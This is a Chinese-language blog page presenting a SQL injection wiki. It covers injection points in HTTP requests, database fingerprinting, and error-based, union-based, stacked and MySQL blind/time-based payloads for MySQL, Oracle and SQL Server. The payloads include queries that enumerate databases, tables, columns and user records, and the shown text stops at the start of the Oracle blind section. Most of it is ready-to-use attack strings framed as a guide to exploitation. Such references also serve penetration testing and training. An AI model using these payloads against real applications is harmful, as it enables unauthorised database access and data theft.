<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><script src="/lib/pace/pace.min.js?v=1.0.2"></script><link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet"><script></script><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css"><link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.ico?v=6.3.0"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.ico?v=6.3.0"><link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.ico?v=6.3.0"><link rel="mask-icon" href="/images/logo.ico?v=6.3.0" color="#222"><script type="text/javascript" id="hexo.configurations">var NexT=window.NexT||{},CONFIG={root:"/",scheme:"Pisces",version:"6.3.0",sidebar:{position:"left",display:"post",offset:12,b2t:!1,scrollpercent:!1,onmobile:!1},fancybox:!1,fastclick:!1,lazyload:!1,tabs:!0,motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},algolia:{applicationID:"",apiKey:"",indexName:"",hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}}}</script><meta name="description" content="本wiki的使命是成为一站式资源，用于全面识别，利用和升级各种数据库管理系统（DBMS）中的SQL注入漏洞。"><meta name="keywords" content="SQL,wiki,douiduo,diyz.bid"><meta property="og:type" content="article"><meta property="og:title" content="SQL注入wiki"><meta property="og:url" content="https://www.diyz.bid/Bug/SQL注入/index.html"><meta property="og:site_name" content="doubiduo"><meta property="og:description" content="本wiki的使命是成为一站式资源，用于全面识别，利用和升级各种数据库管理系统（DBMS）中的SQL注入漏洞。"><meta property="og:locale" content="zh-CN"><meta property="og:updated_time" content="2018-08-23T09:23:56.407Z"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="SQL注入wiki"><meta name="twitter:description" content="本wiki的使命是成为一站式资源，用于全面识别，利用和升级各种数据库管理系统（DBMS）中的SQL注入漏洞。"><link rel="alternate" href="/atom.xml" title="doubiduo" type="application/atom+xml"><link rel="canonical" href="https://www.diyz.bid/Bug/SQL注入/"><script type="text/javascript" id="page.configurations">CONFIG.page={sidebar:""}</script><title>SQL注入wiki | doubiduo</title><script async src="https://www.googletagmanager.com/gtag/js?id=UA-124427626-1"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-124427626-1")</script><script type="text/javascript">var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?9c8b377e488072512752a147d13a537c";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><noscript><style type="text/css">.sidebar-inner,.use-motion .brand,.use-motion .collection-title,.use-motion .comments,.use-motion .menu-item,.use-motion .motion-element,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .logo,.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.logo-line-after i{right:initial}</style></noscript><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle=window.adsbygoogle||[]).push({google_ad_client:"ca-pub-2020224399094607",enable_page_level_ads:!0})</script></head><body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN"><div class="container sidebar-position-left page-post-detail"><div class="headband"></div><header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-wrapper"><div class="site-meta"><div class="custom-logo-site-title"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">doubiduo</span><span class="logo-line-after"><i></i></span></a></div><h1 class="site-subtitle" itemprop="description">diyz.bid</h1></div><div class="site-nav-toggle"> <button aria-label="切换导航栏"><span class="btn-bar"></span><span class="btn-bar"></span><span class="btn-bar"></span></button></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i><br>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i><br>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i><br>归档</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="menu-item-icon fa fa-fw fa-link"></i><br>友情链接</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user-circle"></i><br>关于</a></li><li class="menu-item menu-item-search"><a href="javascript:;" class="popup-trigger"><i class="menu-item-icon fa fa-search fa-fw"></i><br>搜索</a></li></ul><div class="site-search"><div class="popup search-popup local-search-popup"><div class="local-search-header clearfix"><span class="search-icon"><i class="fa fa-search"></i></span><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span><div class="local-search-input-wrapper"> <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input"></div></div><div id="local-search-result"></div></div></div></nav></div></header><main id="main" class="main"><div class="main-inner"><div class="content-wrap"><div id="content" class="content"><div id="posts" class="posts-expand"><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="https://www.diyz.bid/Bug/SQL注入/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content=""><meta itemprop="description" content=""><meta itemprop="image" content="/images/diyz.jpg"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="doubiduo"></span><header class="post-header"><h2 class="post-title" itemprop="name headline">SQL注入wiki</h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建时间：2018-07-26 09:51:01" itemprop="dateCreated datePublished" datetime="2018-07-26T09:51:01+08:00">2018-07-26</time> <span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-calendar-check-o"></i></span> <span class="post-meta-item-text">更新于</span> <time title="修改时间：2018-08-23 17:23:56" itemprop="dateModified" datetime="2018-08-23T17:23:56+08:00">2018-08-23</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Bug/" itemprop="url" rel="index"><span itemprop="name">Bug</span></a></span></span> <span class="post-symbolscount"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">本文字数：</span> <span title="本文字数">49k</span></span> <span id="/Bug/SQL注入/" class="leancloud_visitors" data-flag-title="SQL注入wiki"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-eye"></i></span> <span class="post-meta-item-text">阅读次数：</span><span class="leancloud-visitors-count"></span></span><div class="post-description">本wiki的使命是成为一站式资源，用于全面识别，利用和升级各种数据库管理系统（DBMS）中的SQL注入漏洞。</div></div></header><div class="post-body" itemprop="articleBody"><h2 id="1-检测SQL注入"><a href="#1-检测SQL注入" class="headerlink" title="1. 检测SQL注入"></a>1. 检测SQL注入</h2><p>　　可以通过多种方式检测注入。其中最简单的方法是在各种参数后添加<code>&#39;</code>或<code>&quot;</code>从而得到一个从Web服务器返回的数据库报错信息。以下部分描述了在哪里可以找到这些参数以及如何检测这些参数。<br><a id="more"></a></p><h3 id="参数位置"><a href="#参数位置" class="headerlink" title="参数位置"></a>参数位置</h3><p><strong>HTTP请求中常见的注入点如下</strong></p><ul><li>GET - HTTP Request<br>　　在常见的HTTP GET请求（以及大多数请求类型）中，有一些常见的注入点。例如：网址参数（下面的请求的<code>id</code>），Cookie，host以及任何自定义headers信息。然而，HTTP请求中的任何内容都可能容易受到SQL注入的攻击。</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?id=注入点1</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 注入点2</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.9</span><br><span class="line"><span class="attribute">X-Server-Name</span>: 注入点3</span><br><span class="line"><span class="attribute">Cookie</span>: user=注入点4;</span><br></pre></td></tr></table></figure><ul><li>POST - Form Data<br>　　在具有Content-Type为application/x-www-form-urlencoded的标准HTTP POST请求中，注入将类似于GET请求中的URL参数。它们位于HTTP头信息下方，但仍可以用相同的方式进行利用。</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: netspi.com.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 39</span><br><span class="line"></span><br><span class="line">username=注入点1&amp;email=注入点2</span><br></pre></td></tr></table></figure><ul><li>POST - JSON<br>　　在具有Content-Type为application/json的标准HTTP POST请求中，注入通常是<code>JSON{&quot;key&quot;:&quot;value&quot;}</code>对的值。该值也可以是数组或对象。虽然符号是不同的，但值可以像所有其他参数一样注入。（提示：尝试使用<code>&#39;</code>，但要确保JSON使用双引号，否则可能会破坏请求格式。）</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: netspi.com.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 56</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">"username":"注入点1",</span><br><span class="line">"email":"注入点2"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>POST - XML<br>　　在具有Content-Type为application/xml的标准HTTP POST请求中，注入通常在一个内部<xmlobject></xmlobject>。虽然符号是不同的，但值可以像所有其他参数一样注入。（提示：尝试使用<code>&#39;</code>）</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: netspi.com.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/xml</span><br><span class="line"><span class="attribute">Content-Length</span>: 79</span><br><span class="line"></span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;username&gt;注入点1&lt;/username&gt;</span><br><span class="line">&lt;email&gt;注入点2&lt;/email&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><h3 id="检测注入"><a href="#检测注入" class="headerlink" title="检测注入"></a>检测注入</h3><p>　　通过在应用程序中触发错误和布尔逻辑，可以最轻松地检测易受攻击的参数。提供格式错误的查询将触发错误，并且使用各种布尔逻辑语句发送有效查询将触发来自Web服务器的不同响应。</p><p>注：True或False语句应通过HTTP状态码或HTML内容返回不同的响应。如果这些响应与查询的True/False性质一致，则表示存在注入。</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>逻辑测试</td><td style="text-align:center">page.asp?id=1 or 1=1 – true<br>page.asp?id=1’ or 1=1 – true<br>page.asp?id=1” or 1=1 – true<br>page.asp?id=1 and 1=2 – false</td></tr><tr><td>算术</td><td style="text-align:center">product.asp?id=1/1 – true<br> product.asp?id=1/0 – false</td></tr><tr><td>基于盲注：<br>检测盲注可能需要识别或猜测DBMS，<br>并检查以找到适当的时间函数。</td><td style="text-align:center"><a href="#blindBased">详见</a></td></tr><tr><td>基于错误：<br>注意：使用无效语法的逻辑测试和算术<br>也可能会导致错误。</td><td style="text-align:center"><a href="#errorBased">详见</a></td></tr></tbody></table><h2 id="2-DBMS识别"><a href="#2-DBMS识别" class="headerlink" title="2.DBMS识别"></a>2.DBMS识别</h2><p>　　检测正在使用的数据库管理系统（DBMS）对于进一步利用注入来说至关重要。没有这些知识，就无法确定要查询的表，内置的函数以及要避免的检测。下面查询的成功响应表明正在使用所选的DBMS.</p><p>注意：注释字符 <code>--</code> 放置在查询后面，以删除查询后面的任何命令，有助于防止出现错误。</p><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>SLEEP</td><td style="text-align:center">page.php?id=1’-SLEEP(1)=0 LIMIT 1 –</td></tr><tr><td>BENCHMARK</td><td style="text-align:center">page.php?id=1’-BENCHMARK(5000000, ENCODE(‘Slow Down’,’by 5 seconds’))=0 LIMIT 1 –</td></tr><tr><td>字符串连接</td><td style="text-align:center">page.php?id=’ ‘mysql’ –</td></tr><tr><td>错误消息<br>注意：通过无效语法触发数据库错误<br>有时会返回包含DBMS名称的详细错误消息。</td><td style="text-align:center">page.php?id=’</td></tr></tbody></table><p><strong>一般提示</strong></p><p>　　PHP应用程序通常具有MySQL数据库。</p><p><strong>将查询转换为注入</strong></p><p>　　既然已经确定了注入点，本指南的其余部分将包含完整的查询。使用以下方法将这些查询插入注入点。<code>SELECT @@version</code>将是示例查询。</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>联合查询</td><td style="text-align:center">product.php?id=’ UNION SELECT @@version –</td></tr><tr><td>联合子查询</td><td style="text-align:center">product.php?id=’ UNION (SELECT @@version) –</td></tr><tr><td>联合null<br>注意：如果原始查询返回多个列，<br>则添加null以等于列数</td><td style="text-align:center">product.php?id=4 UNION SELECT @@version,null –</td></tr><tr><td>堆积式查询<br>注意：堆积式查询并不总是返回结果，<br>因此它们最适合用于更新/修改数据的注入。</td><td style="text-align:center">product.php?id=’; INSERT INTO ‘docs’ (‘content’) VALUES ((SELECT @@version)) –</td></tr></tbody></table><h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>字符串连接</td><td style="text-align:center">page.jsp?id=’&#124;&#124;’oracle’ –</td></tr><tr><td>默认表</td><td style="text-align:center">page.jsp?id=’UNION SELECT 1 FROM v$version –</td></tr><tr><td>错误消息<br>注意：通过无效语法触发数据库错误<br>有时会返回包含DBMS名称的详细错误消息。</td><td style="text-align:center">page.jsp?id=’</td></tr></tbody></table><p><strong>一般提示</strong></p><p>　　根据应用程序提供的错误，如果存在“ORA-XXXX”错误，其中每个X都是整数，则表示数据库是Oracle.</p><p>　　JSP应用程序通常具有Oracle数据库。</p><p><strong>将查询转换为注入</strong></p><p>　　既然已经确定了诸如点，本指南的其余部分将包含完整的查询。使用以下方法将这些查询插入注入点。<code>SELECT banner FROM v$version</code>将是示例查询。</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>联合查询</td><td style="text-align:center">product.jsp?id=’ UNION SELECT banner FROM v$version –</td></tr><tr><td>联合子查询</td><td style="text-align:center">product.jsp?id=’ UNION (SELECT banner FROM v$version) –</td></tr><tr><td>联合null<br>注意:如果原始查询返回多个列，<br>则添加null以等于列数-1</td><td style="text-align:center">product.jsp?id=’ UNION SELECT banner,null FROM v$version –</td></tr></tbody></table><h3 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h3><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>WAITFOR 函数</td><td style="text-align:center">page.asp?id=’;WAITFOR DELAY ‘00&#58;00&#58;10’; –</td></tr><tr><td>默认变量</td><td style="text-align:center">page.asp?id=sql’; SELECT @@SERVERNAME –</td></tr><tr><td>错误消息<br>注意：通过无效语法触发数据库错误<br>有时会返回包含DBMS名称的详细错误消息。</td><td style="text-align:center">page.asp?id=’</td></tr><tr><td>错误消息<br>注意：如果id参数是整数，<br>则@@ SERVERNAME变量的字符串值可能导致转换错误。</td><td style="text-align:center">page.asp?id=@@SERVERNAME</td></tr><tr><td>错误消息<br>注意：如果id参数是整数，<br>则@@ SERVERNAME变量的字符串值可能导致转换错误。</td><td style="text-align:center">page.asp?id=0/@@SERVERNAME</td></tr></tbody></table><p><strong>一般提示</strong></p><p>　　基于ASP / ASPX的应用程序一般都是MSSQL。</p><p><strong>将查询转换为注入</strong></p><p>　　既然已经确定了注入点，本指南的其余部分将包含完整的查询。使用以下方法将这些查询插入注入点。<code>SELECT @@version</code>将是示例查询。</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>联合查询</td><td style="text-align:center">product.asp?id=’ UNION SELECT @@version –</td></tr><tr><td>联合子查询</td><td style="text-align:center">product.asp?id=’ UNION (SELECT @@version) –</td></tr><tr><td>联合null<br>注意：如果原始查询返回多个列，<br>则添加null以等于列数</td><td style="text-align:center">product.asp?id=’ UNION (SELECT @@version,null) –</td></tr><tr><td>堆积式查询<br>注意：堆积式查询并不总是返回结果，<br>因此它们最适合用于更新/修改数据的注入。</td><td style="text-align:center">product.asp?id=’; SELECT @@version –</td></tr></tbody></table><h2 id="3-注入类型"><a href="#3-注入类型" class="headerlink" title="3.注入类型"></a>3.注入类型</h2><h3 id="显错注入"><a href="#显错注入" class="headerlink" title="显错注入"></a><span id="errorBased">显错注入</span></h3><p>　　当无效输入传递给数据库时，通过触发数据库中的错误来利用基于错误的注入。错误消息可用于返回完整的查询结果，或获取有关如何重构查询以供进一步利用的信息。</p><h4 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h4><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>XML解析错误</td><td style="text-align:center">SELECT extractvalue(rand(),concat(0x3a,(select version())))</td></tr><tr><td>双查询</td><td style="text-align:center">SELECT 1 AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(<strong>SELECT username FROM USERS LIMIT 0,1</strong>),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)<br>递增 limit 0,1到limit 1,1开始循环数据</td></tr><tr><td>获取当前数据库</td><td style="text-align:center">SELECT a()</td></tr></tbody></table><h4 id="Oracle-1"><a href="#Oracle-1" class="headerlink" title="Oracle"></a>Oracle</h4><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>无效的HTTP请求</td><td style="text-align:center">SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual</td></tr><tr><td>CTXSYS.DRITHSX.SN</td><td style="text-align:center">SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual</td></tr><tr><td>无效的XPath</td><td style="text-align:center">SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual</td></tr><tr><td>无效的XML</td><td style="text-align:center">SELECT to_char(dbms_xmlgen.getxml(‘select “‘&#124;&#124;(select user from sys.dual)&#124;&#124;’” FROM sys.dual’)) FROM dual</td></tr><tr><td>无效的XML</td><td style="text-align:center">SELECT rtrim(extract(xmlagg(xmlelement(“s”, username &#124;&#124; ‘,’)),’/s’).getstringval(),’,’) FROM all_users</td></tr></tbody></table><h4 id="SQL-Server-1"><a href="#SQL-Server-1" class="headerlink" title="SQL Server"></a>SQL Server</h4><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>显式转换</td><td style="text-align:center">SELECT convert(int,(SELECT @@version))<br>SELECT cast((SELECT @@version) as int)</td></tr><tr><td>隐式转换</td><td style="text-align:center">SELECT 1/@@version</td></tr></tbody></table><h4 id="MSSQL-CAST函数示例"><a href="#MSSQL-CAST函数示例" class="headerlink" title="MSSQL CAST函数示例"></a>MSSQL CAST函数示例</h4><p>　　以下任何查询都可以使用该<code>convert</code>函数重写或作为隐式转换.</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>将CAST函数注入当前查询</td><td style="text-align:center">SELECT CAST(@@version as int)</td></tr><tr><td>显示系统用户</td><td style="text-align:center">SELECT CAST(SYSTEM_USER as int);</td></tr><tr><td>用xml路径在一行中显示所有数据库</td><td style="text-align:center">SELECT CAST((SELECT name,’,’ FROM master..sysdatabases FOR XML path(‘’)) as int)<br>SELECT CAST((SELECT name AS “data()” FROM master..sysdatabases FOR xml path(‘’)) AS int);</td></tr><tr><td>显示服务器名称</td><td style="text-align:center">SELECT CAST(@@SERVERNAME as int);</td></tr><tr><td>显示服务名称</td><td style="text-align:center">SELECT CAST(@@SERVICENAME as int);</td></tr><tr><td>显示数据库列表<br>注意：下面的查询必须在一行中执行。</td><td style="text-align:center"><code>DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr = &#39;&#39;;SELECT @listStr = @listStr + Name + &#39;,&#39; FROM master..sysdatabases;SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);SELECT CAST(@myoutput as int);</code></td></tr><tr><td>显示表列表<br> 注意：下面的查询必须在一行中执行</td><td style="text-align:center"><code>DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX); SET @listStr = &#39;&#39;;SELECT @listStr = @listStr + Name + &#39;,&#39; FROM MYDATABASE..sysobjects WHERE type = &#39;U&#39;;SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);SELECT CAST(@myoutput as int);</code></td></tr><tr><td>显示列列表<br>注意：下面的查询必须在一行中执行。</td><td style="text-align:center"><code>DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr = &#39;&#39;;SELECT @listStr = @listStr + Name + &#39;,&#39; FROM MYDATABASE..syscolumns WHERE id=object_id(&#39;MYTABLE&#39;);SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);select cast(@myoutput as int);</code></td></tr><tr><td>显示列数据<br>注意：下面的查询必须在一行中执行。 用<code>*</code>替换<code>MYCOLUMN</code>来选择所有列</td><td style="text-align:center"><code>DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr = &#39;&#39;;SELECT @listStr = @listStr + MYCOLUMN + &#39;,&#39; FROM MYDATABASE..MYTABLE;SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1)SELECT CAST(@myoutput as int);</code></td></tr><tr><td>一次显示一个数据库名称<br>注意：递增内部TOP值以获取下一条记录</td><td style="text-align:center"><code>SELECT TOP 1 CAST(name as int) FROM sysdatabases WHERE name in (SELECT TOP 2 name FROM sysdatabases ORDER BY name ASC) ORDER BY name DESC</code></td></tr></tbody></table><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>　　基于联合的SQL注入允许攻击者通过扩展原始查询返回的结果来从数据库中提取信息。 仅当原始/新查询具有相同结构（列的数量和数据类型）时，才能使用联合运算符。</p><h4 id="MySQL-1"><a href="#MySQL-1" class="headerlink" title="MySQL"></a>MySQL</h4><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>联合</td><td style="text-align:center">SELECT “mysql” UNION SELECT @@version</td></tr><tr><td>联合子查询</td><td style="text-align:center">SELECT “mysql” UNION (select @@version)</td></tr><tr><td>联合null<br>注意：如果原始查询返回多个列，则添加null以等于列数</td><td style="text-align:center">SELECT “mysql”,”test” UNION SELECT @@version,null</td></tr><tr><td>堆叠查询<br>注意：堆叠查询并不总是返回结果，因此它们最适合用于更新/修改数据的注入。</td><td style="text-align:center">SELECT “mysql”; INSERT INTO ‘docs’ (‘content’) VALUES ((SELECT @@version))</td></tr></tbody></table><h4 id="Oracle-2"><a href="#Oracle-2" class="headerlink" title="Oracle"></a>Oracle</h4><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>联合</td><td style="text-align:center">SELECT user FROM dual UNION SELECT * FROM v$version</td></tr><tr><td>联合子查询</td><td style="text-align:center">SELECT user FROM dual UNION (SELECT * FROM v$version)</td></tr><tr><td>联合null<br>注意：如果原始查询返回多个列，则添加null以等于列数</td><td style="text-align:center">SELECT user,dummy FROM dual UNION (SELECT banner,null FROM v$version)</td></tr></tbody></table><h4 id="SQL-Server-2"><a href="#SQL-Server-2" class="headerlink" title="SQL Server"></a>SQL Server</h4><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>联合</td><td style="text-align:center">SELECT user UNION SELECT @@version</td></tr><tr><td>联合子查询</td><td style="text-align:center">SELECT user UNION (SELECT @@version)</td></tr><tr><td>联合null<br> 注意：如果原始查询返回多个列，则添加null以等于列数</td><td style="text-align:center">SELECT user,system_user UNION (SELECT @@version,null)</td></tr><tr><td>联合null二进制减半<br>注意：此查询用于检测列数。[numberOfColumns]大于列数则返回错误，从而找到表中列的数目。</td><td style="text-align:center">SELECT * FROM yourtable ORDER BY [numberOfColumns]</td></tr><tr><td>堆积式查询<br>注意：堆积式查询并不总是返回结果，因此它们最适合用于更新/修改数据的注入。</td><td style="text-align:center">SELECT @@version; SELECT @@version –</td></tr></tbody></table><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a><span id="blindBased">盲注</span></h3><p>　　盲注是更高级的注入方法之一。部分盲和全盲方法详述如下。执行这些查询时要小心，因为如果通过大量自动化执行，它们可能会使服务器过载。</p><h4 id="MySQL-2"><a href="#MySQL-2" class="headerlink" title="MySQL"></a>MySQL</h4><p><strong>部分盲</strong></p><p>　　部分盲注是指返回HTTP状态代码或HTML响应中的其他标记的查询，他们指示真或假陈述。下面的查询将试图通过在猜测的信息上声明真实或错误的响应来利用注入。真或假查询也可以通过返回1（真）或0（假）行来识别。一个错误也可以用来标识0（False）。</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>版本是5.xx</td><td style="text-align:center">SELECT substring(version(),1,1)=5</td></tr><tr><td>子选择启用</td><td style="text-align:center">SELECT 1 AND (select 1)=1</td></tr><tr><td>表log_table存在</td><td style="text-align:center">SELECT 1 AND (select 1 from log_table limit 0,1)=1</td></tr><tr><td>列message存在于表log_table中<br>注意：如果列不存在，则查询应该出错</td><td style="text-align:center">SELECT message FROM log_table LIMIT 0,1</td></tr><tr><td>第一条message的第一个字母是t</td><td style="text-align:center">SELECT ascii(substring((SELECT message from log_table limit 0,1),1,1))=114</td></tr></tbody></table><p><strong>将部分盲查询转换为全盲查询</strong></p><p>　　通过使用以下转换，可以在全盲方案中使用上述任何查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">IF</span>(*PARTIAL_BLIND_QUERY*, <span class="keyword">SLEEP</span>(<span class="number">5</span>), <span class="literal">null</span>)</span><br></pre></td></tr></table></figure><p><strong>全盲</strong></p><p>　　部分盲注可以通过HTTP响应中的不同HTTP状态代码，响应时间，内容长度和HTML内容来确定。这些标记可以指示真或假的陈述。下面的查询将试图通过在猜测的信息上声明真或假的响应来利用注入。真或假查询也可以通过返回1（真）或0（假）行来识别。一个错误也可以用来标识0（False）。</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>用户是root</td><td style="text-align:center">SELECT IF(user() LIKE ‘root@%’, SLEEP(5), null)</td></tr><tr><td>用户是root（Benchmark 方法）</td><td style="text-align:center">SELECT IF(user() LIKE ‘root@%’, BENCHMARK(5000000, ENCODE(‘Slow Down’,’by 5 seconds’)), null)</td></tr><tr><td>版本是5.xx</td><td style="text-align:center">SELECT IF(SUBSTRING(version(),1,1)=5,SLEEP(5),null)</td></tr></tbody></table><h4 id="Oracle-3"><a href="#Oracle-3" class="headerlink" title="Oracle"></a>Oracle</h4><p><strong>部分盲</strong></p><p>　　